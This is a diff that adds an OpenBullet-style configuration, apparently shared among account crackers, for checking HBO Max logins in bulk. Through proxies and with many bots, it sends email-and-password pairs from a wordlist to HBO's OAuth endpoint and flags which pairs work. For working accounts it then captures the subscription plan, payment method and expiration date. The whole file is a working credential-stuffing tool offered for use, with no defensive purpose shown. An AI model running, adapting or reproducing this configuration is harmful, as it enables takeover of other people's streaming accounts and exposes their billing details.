@@ -1,0 +1,148 @@
+[SETTINGS]
+{
+  "Name": "HBO MAX APi",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-20T21:40:03.7440125+00:00",
+  "AdditionalInfo": "",
+  "Author": "Sparta",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://oauth.api.hbo.com/auth/tokens" 
+  CONTENT "{\"client_id\":\"7161aff6-188a-4718-8d35-69c6ae58884f\",\"client_secret\":\"7161aff6-188a-4718-8d35-69c6ae58884f\",\"scope\":\"browse video_playback_free account_registration\",\"grant_type\":\"client_credentials\",\"deviceSerialNumber\":\"6fdfa460-6f85-4d75-ad81-2bdfc6577017\",\"clientDeviceData\":{\"paymentProviderCode\":\"google-play\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "X-Hbo-Client-Version: Hadron/52.25.0.33 android/52.25.0.33 (ASUS_Z01QD/7.1.2)" 
+  HEADER "X-Hbo-Device-Name: android" 
+  HEADER "Accept: application/vnd.hbo.v9.full+json" 
+  HEADER "X-Hbo-Device-Os-Version: 7.1.2" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Content-Type: application/json" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 7.1.2; ASUS_Z01QD Build/N2G48H)" 
+  HEADER "Host: oauth.api.hbo.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "Content-Length: 316" 
+
+#accessToken PARSE "<SOURCE>" LR "\"access_token\":\"" "\",\"" -> VAR "accessToken" 
+
+REQUEST POST "https://sessions.api.hbo.com/sessions/v1/clientConfig" 
+  CONTENT "{\"contract\":\"hadron:1.1.2.0\",\"preferredLanguages\":[\"en-us\"]}" 
+  CONTENTTYPE "application/json" 
+  HEADER "X-Hbo-Client-Version: Hadron/52.25.0.33 android/52.25.0.33 (ASUS_Z01QD/7.1.2)" 
+  HEADER "X-Hbo-Device-Name: android" 
+  HEADER "Accept: application/vnd.hbo.v9.full+json" 
+  HEADER "X-Hbo-Device-Os-Version: 7.1.2" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Authorization: Bearer <accessToken>" 
+  HEADER "Content-Type: application/json" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 7.1.2; ASUS_Z01QD Build/N2G48H)" 
+  HEADER "Host: sessions.api.hbo.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "Content-Length: 60" 
+
+#entitlements PARSE "<SOURCE>" LR "\"entitlements\":\"" "\",\"" -> VAR "entitlements" 
+
+REQUEST POST "https://oauth-us.api.hbo.com/auth/tokens" 
+  CONTENT "{\"grant_type\":\"user_name_password\",\"scope\":\"browse video_playback device elevated_account_management\",\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "x-hbo-headwaiter: entitlements:<entitlements>" 
+  HEADER "X-Hbo-Client-Version: Hadron/52.25.0.33 android/52.25.0.33 (ASUS_Z01QD/7.1.2)" 
+  HEADER "X-Hbo-Device-Name: android" 
+  HEADER "Accept: application/vnd.hbo.v9.full+json" 
+  HEADER "X-Hbo-Device-Os-Version: 7.1.2" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Authorization: Bearer <accessToken>" 
+  HEADER "Content-Type: application/json" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 7.1.2; ASUS_Z01QD Build/N2G48H)" 
+  HEADER "Host: oauth-us.api.hbo.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "Content-Length: 171" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Failure OR 
+    KEY "The email address or password is incorrect" 
+    KEY "invalid_credentials" 
+
+#Tk PARSE "<SOURCE>" JSON "access_token" -> VAR "Tk" 
+
+REQUEST GET "https://commerce.api.hbo.com/status" 
+  
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "authorization: Bearer <Tk>" 
+  HEADER "content-type: application/json; charset=utf-8" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36" 
+  HEADER "x-hbo-client-version: Commerce-Experience/1.6.82 desktop (DESKTOP)" 
+  HEADER "x-hbo-headwaiter: entitlements:<entitlements>," 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "accept: */*" 
+  HEADER "origin: https://www.hbomax.com" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+
+#Status PARSE "<SOURCE>" JSON "userState" CreateEmpty=FALSE -> CAP "State" 
+
+#Plan PARSE "<SOURCE>" LR "Current Plan:\",\"value\":\"" "\",\"" CreateEmpty=FALSE -> CAP "Plan" 
+
+#Payment_method PARSE "<SOURCE>" LR "Your HBO Max subscription is billed through\",\"value\":\"" "\",\"" CreateEmpty=FALSE -> CAP "Payment method" 
+
+#Expiration_date PARSE "<SOURCE>" LR "\"subscriptionExpirationDate\":\"" "T" CreateEmpty=FALSE -> CAP "Expiration date" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "\"userState\":\"lapsed\"" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "You’re not subscribed to HBO Max" 
+    KEY "\"userState\":\"abandoner\"" 
+
+SET CAP "Author" "Sparta"
+
